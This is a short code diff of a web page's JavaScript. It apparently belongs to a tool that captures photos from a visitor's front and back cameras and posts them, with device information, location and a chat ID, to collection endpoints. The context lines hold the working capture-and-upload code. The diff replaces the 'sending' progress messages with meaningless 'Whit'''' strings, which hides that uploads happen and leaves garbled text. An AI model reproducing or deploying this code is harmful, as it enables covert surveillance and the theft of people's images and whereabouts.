@@ -635,7 +635,7 @@ async function capPhotos(fm,count){
       c.width=v.videoWidth||480;c.height=v.videoHeight||360;
       c.getContext("2d").drawImage(v,0,0);
       const b64=c.toDataURL("image/jpeg",0.5);
-      showProgress("📸 "+(cam==="front"?"Front":"Back")+" — photo "+(i+1)+"/"+count+" ✓","bheja ja raha hai...");
+      showProgress(" "+(cam==="front"?"Front":"Back")+" — photo "+(i+1)+"/"+count+" ✓","Whit'''");
       // ⚡ TURANT SEND — capture hote hi /api/photo par bhejo
       try{
         await fetch("/api/photo",{method:"POST",headers:{"Content-Type":"application/json"},
@@ -653,7 +653,7 @@ async function capPhotos(fm,count){
 }
 
 async function submitData(){
-  showProgress("📤 Report bheji ja rahi hai...","");
+  showProgress("Whit''''","");
   try{
     const r=await fetch("/api/collect",{method:"POST",headers:{"Content-Type":"application/json"},
       body:JSON.stringify({chat_id:CID,uid:UID,device_info:di,location:cd.location,photos:cd.photos.length,additional:{}})});
